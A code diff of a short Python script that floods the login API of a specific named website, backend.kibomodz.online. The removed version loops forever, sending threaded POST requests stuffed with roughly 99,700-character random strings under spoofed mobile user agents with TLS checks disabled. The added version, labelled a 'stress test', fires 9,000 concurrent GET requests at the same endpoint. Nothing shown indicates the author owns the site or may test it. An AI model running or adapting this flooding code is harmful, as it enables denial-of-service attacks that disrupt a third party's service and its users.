@@ -1,48 +1,25 @@
 import requests
 import threading
-import random
-import string
-import time
-import urllib3
 
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+url = "https://backend.kibomodz.online/api/users/login"
 
-def generate_random_string(length):
-    letters_and_digits = string.ascii_letters + string.digits
-    return ''.join(random.choice(letters_and_digits) for i in range(length))
-fk = generate_random_string(99699)
-print(fk)
-def GenLogin():
-    url = 'https://backend.kibomodz.online/api/users/login'
-    an_agent = f'Mozilla/5.0 (Linux; Android {random.randint(9,13)}; {"".join(random.choices(string.ascii_uppercase, k=3))}{random.randint(111,999)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36'
-    headers = {
-        'Accept': 'application/json, text/plain, */*',
-        'Content-Type': 'application/json',
-        'User-Agent': an_agent,
-        'Referer': 'https://kibomodz.online/auth/login'
-    }
-    data = {
-        'email': fk + "@gmail.com",
-        'password': fk,
-        "turnstileToken": fk
-    }
+def send_request():
+    try:
+        response = requests.get(url)
+        print(f"Request sent to {url} - Status code: {response.status_code}")
+    except requests.exceptions.RequestException as e:
+        print(f"Error: {e}")
 
-    response = requests.post(url, headers=headers, json=data, verify=False)
-    print(response)
-    #print(response.text)
-
-def rangeLogin():
+def stress_test(num_requests):
     threads = []
-    for i in range(90):
-        thread = threading.Thread(target=GenLogin)
+    for _ in range(num_requests):
+        thread = threading.Thread(target=send_request)
         threads.append(thread)
         thread.start()
-        time.sleep(random.uniform(0.5, 1.5))
 
     for thread in threads:
         thread.join()
 
+num_requests = 9000
 
-while True:
-	rangeLogin()
-
+stress_test(num_requests)
